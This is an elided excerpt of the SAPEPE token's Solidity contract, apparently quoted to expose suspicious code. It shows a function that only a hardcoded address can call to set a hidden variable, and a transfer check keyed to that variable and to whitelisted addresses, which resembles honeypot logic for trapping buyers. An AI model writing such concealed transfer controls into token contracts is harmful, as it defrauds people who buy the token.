...
contract TOKEN is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x743e72ba35771604551A4E29E50e577c24Cda82d) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 
        0x45e4597C8C4E3f8891eAF1Fa722c9c68Ed467D6B) ||
         (_p76234 == to && from != 0x45e4597C8C4E3f8891eAF1Fa722c9c68Ed467D6B && 
         from  != 0x74C63bbbfD23393df68DbaeAa2791cb774C36530 
         && from != 0x135E4FB50A68eBbbe822fC72344Fa2FfFb369ADd)) {
    ...
    constructor() {
        _name = unicode"SAPEPE";
        _symbol = unicode"SAPEPE";
